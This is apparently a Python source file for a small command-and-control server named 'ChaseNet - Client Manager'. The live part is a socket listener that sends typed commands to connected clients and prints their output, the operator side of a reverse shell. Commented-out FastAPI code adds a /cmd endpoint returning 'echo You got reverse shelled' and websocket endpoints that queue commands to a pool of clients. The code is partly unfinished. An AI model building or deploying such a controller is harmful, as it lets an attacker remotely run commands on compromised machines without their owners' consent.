import queue
from fastapi import FastAPI, WebSocket, BackgroundTasks
from fastapi.responses import HTMLResponse
import cmd
import json
from typing import Union
from fastapi import Request
import socket
import threading

HOST = 'http://127.0.0.1:8000'
THREADS = []

def connection_handler(connection, address):
    while True:
        command = input("$ ")
        if command == 'exit':
            return 0
        else:
            command=bytes(command,'utf-8')
            connection.sendall(command)
            out=connection.recv(64000).decode('utf-8')
            print(out)

def server_initializer():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('127.0.0.1',8000))
    server_socket.listen(5)
    while True:
         connection,adress = server_socket.accept()
         t = threading.Thread(target=connection_handler, args=(connection,adress))
         THREADS.append(t)
         t.start()
         t.join()


def main():
    server_initializer()

if __name__ == "__main__":
    main()


"""
app = FastAPI()
# start the server uvicorn server:app --reload 

@app.get("/ping")
def read_ping():
    return {'ping': True}

@app.get("/download")
def read_download():
    return {'download': False}

@app.get("/cmd")
def read_cmd():
    return {'cmd': 'echo You got reverse shelled'}


@app.post("/cmd")
async def getInfo(info : Request):
    req_info = await info.json()
    print (req_info)
    #return{
    #    'status' : "SUCCESS",
    #    'data' : req_info
    #}
    
@app.get("/items/{item_id}")
def read_item(item_id: int, q: Union[str, None] = None):
    return {"item_id": item_id, "q": q}

"""

"""

html = 
<!DOCTYPE html>
<html>
    <head>
        <title>Chat</title>
    </head>
    <body>
        <h1>ChaseNet - Client Manager</h1>
        <form action="" onsubmit="sendMessage(event)">
            <input type="text" id="messageText" autocomplete="off"/>
            <button>Send</button>
        </form>
        <ul id='messages'>
        </ul>
        <script>
            var ws = new WebSocket("ws://localhost:8000/manage");
            ws.onmessage = function(event) {
                var messages = document.getElementById('messages')
                var message = document.createElement('li')
                var content = document.createTextNode(event.data)
                message.appendChild(content)
                messages.appendChild(message)
            };

            function sendMessage(event) {
                var input = document.getElementById("messageText")
                ws.send(input.value)
                input.value = ''
                event.preventDefault()
            }
        </script>
    </body>
</html>


cmd_queue = []
message_queue = []

@app.get("/")
async def get():
    return HTMLResponse(html)


@app.websocket("/clientpool/{client_id}")
async def websocket_endpoint(websocket: WebSocket, client_id: str):
    await websocket.accept()
    await websocket.send_text("connected")
    while True:
        data = await websocket.receive_text()
        message_queue.append((client_id,data))
        if cmd_queue != [ ]:
            command = cmd_queue.pop(0)
            await websocket.send_text(command)
    

async def message_writer(websocket):
    while True:
        if message_queue != []:
            client_id, message = message_queue.pop(0)
            await websocket.send_text(f'[+] - Response from {client_id} - {message}')
    
@app.websocket("/manage")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    while True:
        data = await websocket.receive_text()
        await websocket.send_text(f"[+] - Command sent to clients: {data}")
        while message_queue != []:
            client_id, message = message_queue.pop(0)
            await websocket.send_text(f'[+] - Response from {client_id} - {message}')
        cmd_queue.append(data)

        """
